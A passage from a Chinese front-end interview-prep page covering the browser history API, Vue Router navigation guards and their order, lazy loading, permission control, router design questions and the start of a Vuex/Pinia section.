改变了，但浏览器不会刷新页面，这就为单页应用前端路由“更新视图但不重新请求页面”提供了基础。</p>\\n<p><strong>history 路由模式的实现主要基于存在下面几个特性：</strong></p>\\n<ul>\\n<li><code>pushState</code> 和 <code>repalceState</code> 两个 <code>API</code> 来操作实现 <code>URL</code> 的变化 ；</li>\\n<li>我们可以使用 <code>popstate</code>  事件来监听 <code>url</code> 的变化，从而对页面进行跳转（渲染）；</li>\\n<li><code>history.pushState()</code> 或 <code>history.replaceState()</code> 不会触发 <code>popstate</code> 事件，这时我们需要手动触发页面跳转（渲染）。</li>\\n</ul>\\n<p><strong>特点</strong>：虽然美观，但是刷新会出现 <code>404</code> 需要后端进行配置</p>\\n<h3 id=\\"了解history有哪些方法吗-说下它们的区别\\"><a class=\\"header-anchor\\" href=\\"#了解history有哪些方法吗-说下它们的区别\\">#</a> 了解history有哪些方法吗？说下它们的区别</h3>\\n<blockquote>\\n<p><code>history</code> 这个对象在<code>html5</code>的时候新加入两个<code>api</code> <code>history.pushState()</code> 和 <code>history.repalceState()</code> 这两个<code>API</code>可以在不进行刷新的情况下，操作浏览器的历史纪录。唯一不同的是，前者是新增一个历史记录，后者是直接替换当前的历史记录。</p>\\n</blockquote>\\n<p>从参数上来说：</p>\\n<pre class=\\"language-js\\"><code>window.history.pushState(state,title,url)\\n//state：需要保存的数据，这个数据在触发popstate事件时，可以在event.state里获取\\n//title：标题，基本没用，一般传null\\n//url：设定新的历史纪录的url。新的url与当前url的origin必须是一样的，否则会抛出错误。url可以时绝对路径，也可以是相对路径。\\n//如 当前url是 https://www.baidu.com/a/,执行history.pushState(null, null, &#39;./qq/&#39;)，则变成 https://www.baidu.com/a/qq/，\\n//执行history.pushState(null, null, &#39;/qq/&#39;)，则变成 https://www.baidu.com/qq/\\n\\nwindow.history.replaceState(state,title,url)\\n//与pushState 基本相同，但她是修改当前历史纪录，而 pushState 是创建新的历史纪录\\n</code></pre>\\n<p>另外还有：</p>\\n<ul>\\n<li><code>window.history.back()</code> 后退</li>\\n<li><code>window.history.forward()</code>前进</li>\\n<li><code>window.history.go(1)</code> 前进或者后退几步</li>\\n</ul>\\n<p>从触发事件的监听上来说：</p>\\n<ul>\\n<li><code>pushState()</code>和<code>replaceState()</code>不能被<code>popstate</code>事件所监听</li>\\n<li>而后面三者可以，且用户点击浏览器前进后退键时也可以</li>\\n</ul>\\n<h3 id=\\"如何监听-pushstate-和-replacestate-的变化呢\\"><a class=\\"header-anchor\\" href=\\"#如何监听-pushstate-和-replacestate-的变化呢\\">#</a> 如何监听 pushState 和 replaceState 的变化呢？</h3>\\n<p>利用自定义事件<code>new Event()</code>创建这两个事件，并全局监听：</p>\\n<pre class=\\"language-html\\"><code>&lt;body&gt;\\n  &lt;button onclick=&quot;goPage2()&quot;&gt;去page2&lt;/button&gt;\\n  &lt;div&gt;Page1&lt;/div&gt;\\n  &lt;script&gt;\\n    let count = 0;\\n    function goPage2 () {\\n      history.pushState({ count: count++ }, `bb${count}`,&#39;page1.html&#39;)\\n      console.log(history)\\n    }\\n    // 这个不能监听到 pushState\\n    // window.addEventListener(&#39;popstate&#39;, function (event) {\\n    //   console.log(event)\\n    // })\\n    function createHistoryEvent (type) {\\n      var fn = history[type]\\n      return function () {\\n        // 这里的 arguments 就是调用 pushState 时的三个参数集合\\n        var res = fn.apply(this, arguments)\\n        let e = new Event(type)\\n        e.arguments = arguments\\n        window.dispatchEvent(e)\\n        return res\\n      }\\n    }\\n    history.pushState = createHistoryEvent(&#39;pushState&#39;)\\n    history.replaceState = createHistoryEvent(&#39;replaceState&#39;)\\n    window.addEventListener(&#39;pushState&#39;, function (event) {\\n      // { type: &#39;pushState&#39;, arguments: [...], target: Window, ... }\\n      console.log(event)\\n    })\\n    window.addEventListener(&#39;replaceState&#39;, function (event) {\\n      console.log(event)\\n    })\\n  &lt;/script&gt;\\n&lt;/body&gt;\\n</code></pre>\\n<h3 id=\\"vue路由的钩子函数\\"><a class=\\"header-anchor\\" href=\\"#vue路由的钩子函数\\">#</a> Vue路由的钩子函数</h3>\\n<blockquote>\\n<p>首页可以控制导航跳转，<code>beforeEach</code>，<code>afterEach</code>等，一般用于页面<code>title</code>的修改。一些需要登录才能调整页面的重定向功能。</p>\\n</blockquote>\\n<ul>\\n<li><code>beforeEach</code>主要有3个参数<code>to</code>，<code>from</code>，<code>next</code>。</li>\\n<li><code>to</code>：<code>route</code>即将进入的目标路由对象。</li>\\n<li><code>from</code>：<code>route</code>当前导航正要离开的路由。</li>\\n<li><code>next</code>：<code>function</code>一定要调用该方法<code>resolve</code>这个钩子。执行效果依赖n<code>ext</code>方法的调用参数。可以控制网页的跳转</li>\\n</ul>\\n<h3 id=\\"route和-router的区别\\"><a class=\\"header-anchor\\" href=\\"#route和-router的区别\\">#</a> <code>$route</code>和<code>$router</code>的区别</h3>\\n<ul>\\n<li><code>$route</code>是“路由信息对象”，包括<code>path</code>，<code>params</code>，<code>hash</code>，<code>query</code>，<code>fullPath</code>，<code>matched</code>，<code>name</code>等路由信息参数。</li>\\n<li>而<code>$router</code>是“路由实例”对象包括了路由的跳转方法，钩子函数等</li>\\n</ul>\\n<h3 id=\\"vue-router-路由钩子函数是什么-执行顺序是什么\\"><a class=\\"header-anchor\\" href=\\"#vue-router-路由钩子函数是什么-执行顺序是什么\\">#</a> vue-router 路由钩子函数是什么 执行顺序是什么</h3>\\n<blockquote>\\n<p>路由钩子的执行流程, 钩子函数种类有:<code>全局守卫</code>、<code>路由守卫</code>、<code>组件守卫</code></p>\\n</blockquote>\\n<ol>\\n<li>导航被触发。</li>\\n<li>在失活的组件里调用 <code>beforeRouteLeave</code> 守卫。</li>\\n<li>调用全局的 <code>beforeEach</code> 守卫。</li>\\n<li>在重用的组件里调用 <code>beforeRouteUpdate</code> 守卫 (<code>2.2+</code>)。</li>\\n<li>在路由配置里调用 <code>beforeEnter</code>。</li>\\n<li>解析异步路由组件。</li>\\n<li>在被激活的组件里调用 <code>beforeRouteEnter</code>。</li>\\n<li>调用全局的 <code>beforeResolve</code> 守卫 (<code>2.5+</code>)。</li>\\n<li>导航被确认。</li>\\n<li>调用全局的 <code>afterEach</code> 钩子。</li>\\n<li>触发 <code>DOM</code> 更新。</li>\\n<li>调用 <code>beforeRouteEnter</code> 守卫中传给 <code>next</code> 的回调函数，创建好的组件实例会作为回调函数的参数传入</li>\\n</ol>\\n<h3 id=\\"vue-router-有哪几种导航守卫\\"><a class=\\"header-anchor\\" href=\\"#vue-router-有哪几种导航守卫\\">#</a> vue-router 有哪几种导航守卫</h3>\\n<ul>\\n<li>全局守卫</li>\\n<li>路由独享守卫</li>\\n<li>路由组件内的守卫</li>\\n</ul>\\n<p><strong>全局守卫</strong></p>\\n<blockquote>\\n<p>vue-router全局有三个守卫</p>\\n</blockquote>\\n<ul>\\n<li><code>router.beforeEach</code> 全局前置守卫 进入路由之前</li>\\n<li><code>router.beforeResolve</code> 全局解析守卫(2.5.0+) 在<code>beforeRouteEnter</code>调用之后调用</li>\\n<li><code>router.afterEach</code> 全局后置钩子 进入路由之后</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>// main.js 入口文件\\nimport router from &#39;./router&#39;; // 引入路由\\nrouter.beforeEach((to, from, next) =&gt; { \\n  next();\\n});\\nrouter.beforeResolve((to, from, next) =&gt; {\\n  next();\\n});\\nrouter.afterEach((to, from) =&gt; {\\n  console.log(&#39;afterEach 全局后置钩子&#39;);\\n});\\n</code></pre>\\n<p><strong>路由独享守卫</strong></p>\\n<blockquote>\\n<p>如果你不想全局配置守卫的话，你可以为某些路由单独配置守卫</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>const router = new VueRouter({\\n  routes: [\\n    {\\n      path: &#39;/foo&#39;,\\n      component: Foo,\\n      beforeEnter: (to, from, next) =&gt; { \\n        // 参数用法什么的都一样,调用顺序在全局前置守卫后面，所以不会被全局守卫覆盖\\n        // ...\\n      }\\n    }\\n  ]\\n})\\n\\n</code></pre>\\n<p><strong>路由组件内的守卫</strong></p>\\n<ul>\\n<li><code>beforeRouteEnter</code> 进入路由前, 在路由独享守卫后调用 不能 获取组件实例 <code>this</code>，组件实例还没被创建</li>\\n<li><code>beforeRouteUpdate</code> (<code>2.2</code>) 路由复用同一个组件时, 在当前路由改变，但是该组件被复用时调用 可以访问组件实例 <code>this</code></li>\\n<li><code>beforeRouteLeave</code> 离开当前路由时, 导航离开该组件的对应路由时调用，可以访问组件实例 <code>this</code></li>\\n</ul>\\n<h3 id=\\"vue-router守卫\\"><a class=\\"header-anchor\\" href=\\"#vue-router守卫\\">#</a> vue-router守卫</h3>\\n<blockquote>\\n<p>导航守卫 <code>router.beforeEach</code> 全局前置守卫</p>\\n</blockquote>\\n<ul>\\n<li><code>to: Route</code>: 即将要进入的目标（路由对象）</li>\\n<li><code>from: Route</code>: 当前导航正要离开的路由</li>\\n<li><code>next: Function</code>: 一定要调用该方法来 <code>resolve</code> 这个钩子。（一定要用这个函数才能去到下一个路由，如果不用就拦截）</li>\\n<li>执行效果依赖 next 方法的调用参数。</li>\\n<li><code>next()</code>: 进行管道中的下一个钩子。如果全部钩子执行完了，则导航的状态就是 confirmed (确认的)。</li>\\n<li><code>next(false)</code>:取消进入路由，url地址重置为from路由地址(也就是将要离开的路由地址)</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>// main.js 入口文件\\nimport router from &#39;./router&#39;; // 引入路由\\nrouter.beforeEach((to, from, next) =&gt; { \\n  next();\\n});\\nrouter.beforeResolve((to, from, next) =&gt; {\\n  next();\\n});\\nrouter.afterEach((to, from) =&gt; {\\n  console.log(&#39;afterEach 全局后置钩子&#39;);\\n});\\n</code></pre>\\n<blockquote>\\n<p>路由独享的守卫 你可以在路由配置上直接定义 <code>beforeEnter</code> 守卫</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>const router = new VueRouter({\\n  routes: [\\n    {\\n      path: &#39;/foo&#39;,\\n      component: Foo,\\n      beforeEnter: (to, from, next) =&gt; {\\n        // ...\\n      }\\n    }\\n  ]\\n})\\n</code></pre>\\n<blockquote>\\n<p>组件内的守卫你可以在路由组件内直接定义以下路由导航守卫</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>const Foo = {\\n  template: `...`,\\n  beforeRouteEnter (to, from, next) {\\n    // 在渲染该组件的对应路由被 confirm 前调用\\n    // 不！能！获取组件实例 `this`\\n    // 因为当守卫执行前，组件实例还没被创建\\n  },\\n  beforeRouteUpdate (to, from, next) {\\n    // 在当前路由改变，但是该组件被复用时调用\\n    // 举例来说，对于一个带有动态参数的路径 /foo/:id，在 /foo/1 和 /foo/2 之间跳转的时候，\\n    // 由于会渲染同样的 Foo 组件，因此组件实例会被复用。而这个钩子就会在这个情况下被调用。\\n    // 可以访问组件实例 `this`\\n  },\\n  beforeRouteLeave (to, from, next) {\\n    // 导航离开该组件的对应路由时调用，我们用它来禁止用户离开\\n    // 可以访问组件实例 `this`\\n    // 比如还未保存草稿，或者在用户离开前，\\n    将setInterval销毁，防止离开之后，定时器还在调用。\\n  }\\n}\\n</code></pre>\\n<h3 id=\\"vue-router中如何保护路由\\"><a class=\\"header-anchor\\" href=\\"#vue-router中如何保护路由\\">#</a> vue-router中如何保护路由</h3>\\n<p><strong>分析</strong></p>\\n<p>路由保护在应用开发过程中非常重要，几乎每个应用都要做各种路由权限管理，因此相当考察使用者基本功。</p>\\n<p><strong>体验</strong></p>\\n<p>全局守卫：</p>\\n<pre class=\\"language-js\\"><code>const router = createRouter({ ... })\\n​\\nrouter.beforeEach((to, from) =&gt; {\\n  // ...\\n  // 返回 false 以取消导航\\n  return false\\n})\\n</code></pre>\\n<p>路由独享守卫：</p>\\n<pre class=\\"language-js\\"><code>const routes = [\\n  {\\n    path: &#39;/users/:id&#39;,\\n    component: UserDetails,\\n    beforeEnter: (to, from) =&gt; {\\n      // reject the navigation\\n      return false\\n    },\\n  },\\n]\\n</code></pre>\\n<p>组件内的守卫：</p>\\n<pre class=\\"language-js\\"><code>const UserDetails = {\\n  template: `...`,\\n  beforeRouteEnter(to, from) {\\n    // 在渲染该组件的对应路由被验证前调用\\n  },\\n  beforeRouteUpdate(to, from) {\\n    // 在当前路由改变，但是该组件被复用时调用\\n  },\\n  beforeRouteLeave(to, from) {\\n    // 在导航离开渲染该组件的对应路由时调用\\n  },\\n}\\n</code></pre>\\n<p><strong>回答</strong></p>\\n<ul>\\n<li><code>vue-router</code>中保护路由的方法叫做路由守卫，主要用来通过跳转或取消的方式守卫导航。</li>\\n<li>路由守卫有三个级别：<code>全局</code>、<code>路由独享</code>、<code>组件级</code>。影响范围由大到小，例如全局的<code>router.beforeEach()</code>，可以注册一个全局前置守卫，每次路由导航都会经过这个守卫，因此在其内部可以加入控制逻辑决定用户是否可以导航到目标路由；在路由注册的时候可以加入单路由独享的守卫，例如<code>beforeEnter</code>，守卫只在进入路由时触发，因此只会影响这个路由，控制更精确；我们还可以为路由组件添加守卫配置，例如<code>beforeRouteEnter</code>，会在渲染该组件的对应路由被验证前调用，控制的范围更精确了。</li>\\n<li>用户的任何导航行为都会走<code>navigate</code>方法，内部有个<code>guards</code>队列按顺序执行用户注册的守卫钩子函数，如果没有通过验证逻辑则会取消原有的导航。</li>\\n</ul>\\n<p><strong>原理</strong></p>\\n<p><code>runGuardQueue(guards)</code>链式的执行用户在各级别注册的守卫钩子函数，通过则继续下一个级别的守卫，不通过进入<code>catch</code>流程取消原本导航</p>\\n<pre class=\\"language-js\\"><code>// 源码\\nrunGuardQueue(guards)\\n  .then(() =&gt; {\\n    // check global guards beforeEach\\n    guards = []\\n    for (const guard of beforeGuards.list()) {\\n      guards.push(guardToPromiseFn(guard, to, from))\\n    }\\n    guards.push(canceledNavigationCheck)\\n\\n    return runGuardQueue(guards)\\n  })\\n  .then(() =&gt; {\\n    // check in components beforeRouteUpdate\\n    guards = extractComponentsGuards(\\n      updatingRecords,\\n      &#39;beforeRouteUpdate&#39;,\\n      to,\\n      from\\n    )\\n\\n    for (const record of updatingRecords) {\\n      record.updateGuards.forEach(guard =&gt; {\\n        guards.push(guardToPromiseFn(guard, to, from))\\n      })\\n    }\\n    guards.push(canceledNavigationCheck)\\n\\n    // run the queue of per route beforeEnter guards\\n    return runGuardQueue(guards)\\n  })\\n  .then(() =&gt; {\\n    // check the route beforeEnter\\n    guards = []\\n    for (const record of to.matched) {\\n      // do not trigger beforeEnter on reused views\\n      if (record.beforeEnter &amp;&amp; !from.matched.includes(record)) {\\n        if (isArray(record.beforeEnter)) {\\n          for (const beforeEnter of record.beforeEnter)\\n            guards.push(guardToPromiseFn(beforeEnter, to, from))\\n        } else {\\n          guards.push(guardToPromiseFn(record.beforeEnter, to, from))\\n        }\\n      }\\n    }\\n    guards.push(canceledNavigationCheck)\\n\\n    // run the queue of per route beforeEnter guards\\n    return runGuardQueue(guards)\\n  })\\n  .then(() =&gt; {\\n    // NOTE: at this point to.matched is normalized and does not contain any () =&gt; Promise&lt;Component&gt;\\n\\n    // clear existing enterCallbacks, these are added by extractComponentsGuards\\n    to.matched.forEach(record =&gt; (record.enterCallbacks = {}))\\n\\n    // check in-component beforeRouteEnter\\n    guards = extractComponentsGuards(\\n      enteringRecords,\\n      &#39;beforeRouteEnter&#39;,\\n      to,\\n      from\\n    )\\n    guards.push(canceledNavigationCheck)\\n\\n    // run the queue of per route beforeEnter guards\\n    return runGuardQueue(guards)\\n  })\\n  .then(() =&gt; {\\n    // check global guards beforeResolve\\n    guards = []\\n    for (const guard of beforeResolveGuards.list()) {\\n      guards.push(guardToPromiseFn(guard, to, from))\\n    }\\n    guards.push(canceledNavigationCheck)\\n\\n    return runGuardQueue(guards)\\n  })\\n  // catch any navigation canceled\\n  .catch(err =&gt;\\n    isNavigationFailure(err, ErrorTypes.NAVIGATION_CANCELLED)\\n      ? err\\n      : Promise.reject(err)\\n  )\\n</code></pre>\\n<p><a href=\\"https://github1s.com/vuejs/router/blob/HEAD/packages/router/src/router.ts#L808-L809\\">源码位置</a></p>\\n<h3 id=\\"怎么实现路由懒加载呢\\"><a class=\\"header-anchor\\" href=\\"#怎么实现路由懒加载呢\\">#</a> 怎么实现路由懒加载呢</h3>\\n<p>这是一道应用题。当打包应用时，JavaScript 包会变得非常大，影响页面加载。如果我们能把不同路由对应的组件分割成不同的代码块，然后当路由被访问时才加载对应组件，这样就会更加高效</p>\\n<pre class=\\"language-js\\"><code>// 将\\n// import UserDetails from &#39;./views/UserDetails&#39;\\n// 替换为\\nconst UserDetails = () =&gt; import(&#39;./views/UserDetails&#39;)\\n​\\nconst router = createRouter({\\n  // ...\\n  routes: [{ path: &#39;/users/:id&#39;, component: UserDetails }],\\n})\\n</code></pre>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>当打包构建应用时，JavaScript 包会变得非常大，影响页面加载。利用路由懒加载我们能把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应组件，这样会更加高效，是一种优化手段</li>\\n<li>一般来说，对所有的<strong>路由都使用动态导入</strong>是个好主意</li>\\n<li>给<code>component</code>选项配置一个返回 <code>Promise</code> 组件的函数就可以定义懒加载路由。例如：<code>{ path: \'/users/:id\', component: () =&gt; import(\'./views/UserDetails\') }</code></li>\\n<li>结合注释 <code>() =&gt; import(/* webpackChunkName: &quot;group-user&quot; */ \'./UserDetails.vue\')</code> 可以做<code>webpack</code>代码分块</li>\\n</ol>\\n<h3 id=\\"vue要做权限管理该怎么做-控制到按钮级别的权限怎么做\\"><a class=\\"header-anchor\\" href=\\"#vue要做权限管理该怎么做-控制到按钮级别的权限怎么做\\">#</a> Vue要做权限管理该怎么做？控制到按钮级别的权限怎么做？</h3>\\n<p><strong>分析</strong></p>\\n<ul>\\n<li>综合实践题目，实际开发中经常需要面临权限管理的需求，考查实际应用能力。</li>\\n<li>权限管理一般需求是两个：页面权限和按钮权限，从这两个方面论述即可。</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/1715e3218aeb3d7c.png\\" alt=\\"\\"></p>\\n<p><strong>思路</strong></p>\\n<ul>\\n<li>权限管理需求分析：页面和按钮权限</li>\\n<li>权限管理的实现方案：分后端方案和前端方案阐述</li>\\n<li>说说各自的优缺点</li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>权限管理一般需求是页面权限和按钮权限的管理</li>\\n<li>具体实现的时候分后端和前端两种方案：</li>\\n</ol>\\n<ul>\\n<li><strong>前端方案</strong> 会把所有路由信息在前端配置，通过路由守卫要求用户登录，用户登录后根据角色过滤出路由表。比如我会配置一个<code>asyncRoutes</code>数组，需要认证的页面在其路由的<code>meta</code>中添加一个<code>roles</code>字段，等获取用户角色之后取两者的交集，若结果不为空则说明可以访问。此过滤过程结束，剩下的路由就是该用户能访问的页面，最后通过<code>router.addRoutes(accessRoutes)</code>方式动态添加路由即可</li>\\n<li><strong>后端方案</strong> 会把所有页面路由信息存在数据库中，用户登录的时候根据其角色查询得到其能访问的所有页面路由信息返回给前端，前端再通过<code>addRoutes</code>动态添加路由信息</li>\\n<li>按钮权限的控制通常会<code>实现一个指令</code>，例如<code>v-permission</code>，将按钮要求角色通过值传给<code>v-permission</code>指令，在指令的<code>moutned</code>钩子中可以判断当前用户角色和按钮是否存在交集，有则保留按钮，无则移除按钮</li>\\n</ul>\\n<ol start=\\"3\\">\\n<li>纯前端方案的优点是实现简单，不需要额外权限管理页面，但是维护起来问题比较大，有新的页面和角色需求就要修改前端代码重新打包部署；服务端方案就不存在这个问题，通过专门的角色和权限管理页面，配置页面和按钮权限信息到数据库，应用每次登陆时获取的都是最新的路由信息，可谓一劳永逸！</li>\\n</ol>\\n<p><strong>可能的追问</strong></p>\\n<ol>\\n<li>类似<code>Tabs</code>这类组件能不能使用<code>v-permission</code>指令实现按钮权限控制？</li>\\n</ol>\\n<pre class=\\"language-html\\"><code>&lt;el-tabs&gt; \\n  &lt;el-tab-pane label=&quot;⽤户管理&quot; name=&quot;first&quot;&gt;⽤户管理&lt;/el-tab-pane&gt; \\n\\t&lt;el-tab-pane label=&quot;⻆⾊管理&quot; name=&quot;third&quot;&gt;⻆⾊管理&lt;/el-tab-pane&gt;\\n&lt;/el-tabs&gt;\\n</code></pre>\\n<ol start=\\"2\\">\\n<li>服务端返回的路由信息如何添加到路由器中？</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>// 前端组件名和组件映射表\\nconst map = {\\n  //xx: require(&#39;@/views/xx.vue&#39;).default // 同步的⽅式\\n  xx: () =&gt; import(&#39;@/views/xx.vue&#39;) // 异步的⽅式\\n}\\n// 服务端返回的asyncRoutes\\nconst asyncRoutes = [\\n  { path: &#39;/xx&#39;, component: &#39;xx&#39;,... }\\n]\\n// 遍历asyncRoutes，将component替换为map[component]\\nfunction mapComponent(asyncRoutes) {\\n  asyncRoutes.forEach(route =&gt; {\\n    route.component = map[route.component];\\n    if(route.children) {\\n      route.children.map(child =&gt; mapComponent(child))\\n    }\\n\\t})\\n}\\nmapComponent(asyncRoutes)\\n</code></pre>\\n<h3 id=\\"如果让你从零开始写一个vue路由-说说你的思路\\"><a class=\\"header-anchor\\" href=\\"#如果让你从零开始写一个vue路由-说说你的思路\\">#</a> 如果让你从零开始写一个vue路由，说说你的思路</h3>\\n<p><strong>思路分析：</strong></p>\\n<p>首先思考<code>vue</code>路由要解决的问题：用户点击跳转链接内容切换，页面不刷新。</p>\\n<ul>\\n<li>借助<code>hash</code>或者<code>history api</code>实现<code>url</code>跳转页面不刷新</li>\\n<li>同时监听<code>hashchange</code>事件或者<code>popstate</code>事件处理跳转</li>\\n<li>根据<code>hash</code>值或者<code>state</code>值从<code>routes</code>表中匹配对应<code>component</code>并渲染</li>\\n</ul>\\n<p><strong>回答范例：</strong></p>\\n<p>一个<code>SPA</code>应用的路由需要解决的问题是<strong>页面跳转内容改变同时不刷新</strong>，同时路由还需要以插件形式存在，所以：</p>\\n<ol>\\n<li>首先我会定义一个<code>createRouter</code>函数，返回路由器实例，实例内部做几件事</li>\\n</ol>\\n<ul>\\n<li>保存用户传入的配置项</li>\\n<li>监听<code>hash</code>或者<code>popstate</code>事件</li>\\n<li>回调里根据<code>path</code>匹配对应路由</li>\\n</ul>\\n<ol start=\\"2\\">\\n<li>将<code>router</code>定义成一个<code>Vue</code>插件，即实现<code>install</code>方法，内部做两件事</li>\\n</ol>\\n<ul>\\n<li>实现两个全局组件：<code>router-link</code>和<code>router-view</code>，分别实现页面跳转和内容显示</li>\\n<li>定义两个全局变量：<code>$route</code>和<code>$router</code>，组件内可以访问当前路由和路由器实例</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>有人提议监听所有 <code>&lt;a&gt;</code> 点击后直接替换页面 <code>HTML</code>，就算完成 <code>SPA</code> 路由；在商品列表切详情但不能刷新页面的要求下，还缺哪些核心环节？</strong></p>\\n<p>还需要用 <code>hash</code> 或 <code>history API</code> 改变 <code>URL</code>，并监听 <code>hashchange</code> 或 <code>popstate</code> 来感知导航。每次变化后要从 <code>routes</code> 表按当前路径匹配组件，再交给路由出口渲染；仅替换 <code>HTML</code> 无法正确处理地址栏、前进后退和组件体系。</p>\\n</li>\\n<li>\\n<p><strong>你要交付一个最小可用路由插件，业务方只提供 <code>{ path, component }</code> 配置，<code>createRouter</code> 和 <code>install</code> 分别承担什么？</strong></p>\\n<p><code>createRouter</code> 应保存配置、维护当前路径、监听浏览器导航事件，并完成路径到组件的匹配。<code>install</code> 负责接入 <code>Vue</code>，注册 <code>router-link</code>、<code>router-view</code>，同时暴露当前路由 <code>$route</code> 与路由器 <code>$router</code>；缺少插件安装层会迫使每个组件重复接线。</p>\\n</li>\\n<li>\\n<p><strong>产品要求 <code>URL</code> 不出现 <code>#</code>，但部署方暂时不能修改服务器回退配置，你会直接切到 <code>history</code> 模式吗？</strong></p>\\n<p>不会只改前端实现就承诺可用，<code>history API</code> 能实现无刷新跳转，但直接访问深层地址还依赖服务器将请求交回 <code>SPA</code> 入口。若部署约束不能调整，应保守选择 <code>hash</code> 模式；代价是 <code>URL</code> 带 <code>#</code>，但浏览器端路由闭环更容易成立。</p>\\n</li>\\n<li>\\n<p><strong>自研路由中点击链接能切换页面，但浏览器后退后内容仍停在新页面，你会先检查哪里？</strong></p>\\n<p>先确认模式对应的事件是否注册：<code>hash</code> 模式监听 <code>hashchange</code>，<code>history</code> 模式监听 <code>popstate</code>。再检查事件回调是否重新读取路径、匹配 <code>routes</code> 并更新响应式当前路由；只在 <code>router-link</code> 点击时渲染，浏览器自身导航就不会触发内容同步。</p>\\n</li>\\n<li>\\n<p><strong>团队争论 <code>router-link</code> 是否直接调用 <code>location.href</code>，在不刷新页面的硬约束下你会怎么实现？</strong></p>\\n<p><code>router-link</code> 应拦截适用的站内导航，通过修改 <code>hash</code> 或调用 <code>history API</code> 更新地址，再由统一路由监听与匹配流程驱动 <code>router-view</code>。直接赋值 <code>location.href</code> 会触发整页加载，违背 <code>SPA</code> 目标；外部链接或无法安全拦截的点击仍应保留浏览器默认行为。</p>\\n</li>\\n<li>\\n<p><strong>权限模块需要知道当前路径并主动跳转登录页，自研插件为什么要同时暴露 <code>$route</code> 和 <code>$router</code>？</strong></p>\\n<p><code>$route</code> 表示当前匹配结果，供组件读取路径等当前路由信息；<code>$router</code> 表示路由器实例，承担主动导航等操作。把二者混成一个可随意修改的对象会模糊状态与行为边界，也让视图难以判断哪些变化应触发重新匹配。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_27-vuex相关\\"><a class=\\"header-anchor\\" href=\\"#_27-vuex相关\\">#</a> 27 Vuex相关</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>五个核心：<code>state</code>（唯一数据源）、<code>getters</code>（派生值，有缓存）、<code>mutations</code>（<strong>同步</strong>改 state，唯一合法入口）、<code>actions</code>（可异步，提交 mutation）、<code>modules</code>（按业务拆分）</li>\\n<li><code>mutation</code> 必须同步的原因：<code>devtools</code> 靠记录每次 mutation 做时间旅行，异步会让状态变更和记录对不上</li>\\n<li>组件里取值要收敛到 <code>getters</code>，别写 <code>$store.state.a.b.c.d</code> —— 字段一改就要全局搜</li>\\n<li>什么该放 store：跨组件共享 + 跨路由存活的（用户信息、权限、购物车）；弹窗开关、表单临时值留在组件里</li>\\n<li><code>Pinia</code> 已是官方推荐：去掉了 <code>mutations</code>、天然支持 <code>TS</code>、不用嵌套模块、体积更小</li>\\n</ul>\\n<p><strong><code>Vuex</code> 是集中管理跨组件共享状态的库，核心分为 <code>state</code>、<code>getters</code>、<code>mutations</code>、<code>actions</code> 和 <code>modules</code>。</strong> <code>mutations</code> 必须同步修改状态，便于记录每次变更；异步请求和业务组合放进 <code>actions</code>，再提交 <code>mutation</code>。我一般只把用户信息、权限等全局共享数据放进 <code>store</code>，表单临时值留在组件内。新项目可优先考虑 <code>Pinia</code>，它去掉了 <code>mutations</code>，类型支持和模块组织也更简单。</p>\\n</section>\\n<blockquote>\\n<p><strong>版本说明（面试主线）</strong>：<strong>Vuex 已进入维护模式，Vue 3 官方推荐用 Pinia</strong>（本节后面有专门的 Pinia 小节）。面试若不限定版本，状态管理应以 <strong>Pinia</strong> 为主线回答——它去掉了 mutations（只有 state/getters/actions，直接改 state）、完整的 TS 类型推导、组合式风格（<code>defineStore</code> 可用 setup 函数写）、扁平的 store 结构（无嵌套 module 和命名空间）。本节的 Vuex 作为「概念仍通用、且大量存量项目在用」的内容保留,其 <code>mutation</code>/<code>action</code> 分离、<code>module</code> + 命名空间等设计仍值得理解。</p>\\n</blockquote>\\n<h3 id=\\"vuex是什么-怎么使用-哪种功能场景使用它\\"><a class=\\"header-anchor\\" href=\\"#vuex是什么-怎么使用-哪种功能场景使用它\\">#</a> vuex是什么？怎么使用？哪种功能场景使用它？</h3>\\n<blockquote>\\n<p><code>Vuex</code> 是一个专为 <code>Vue.js</code> 应用程序开发的状态管理模式。<code>vuex</code> 就是一个仓库，仓库里放了很多对象。其中 <code>state</code> 就是数据源存放地，对应于一般 vue 对象里面的 <code>data</code> 里面存放的数据是响应式的，<code>vue</code> 组件从 <code>store</code> 读取数据，若是 <code>store</code> 中的数据发生改变，依赖这相数据的组件也会发生更新它通过 <code>mapState</code> 把全局的 <code>state</code> 和 <code>getters</code> 映射到当前组件的 <code>computed</code> 计算属性</p>\\n</blockquote>\\n<ul>\\n<li><code>vuex</code> 一般用于中大型 <code>web</code> 单页应用中对应用的状态进行管理，对于一些组件间关系较为简单的小型应用，使用 <code>vuex</code> 的必要性不是很大，因为完全可以用组件 <code>prop</code> 属性或者事件来完成父子组件之间的通信，<code>vuex</code> 更多地用于解决跨组件通信以及作为数据中心集中式存储数据。</li>\\n<li>使用<code>Vuex</code>解决非父子组件之间通信问题 <code>vuex</code> 是通过将 <code>state</code> 作为数据中心、各个组件共享 <code>state</code> 实现跨组件通信的，此时的数据完全独立于组件，因此将组件间共享的数据置于 <code>State</code> 中能有效解决多层级组件嵌套的跨组件通信问题</li>\\n</ul>\\n<blockquote>\\n<p><code>vuex</code> 的 <code>State</code> 在单页应用的开发中本身具有一个“数据库”的作用，可以将组件中用到的数据存储在 <code>State</code> 中，并在 <code>Action</code> 中封装数据读写的逻辑。这时候存在一个问题，一般什么样的数据会放在 <code>State</code> 中呢？ 目前主要有两种数据会使用 <code>vuex</code> 进行管理：</p>\\n</blockquote>\\n<ul>\\n<li>组件之间全局共享的数据</li>\\n<li>通过后端异步请求的数据</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/07/62.png\\" 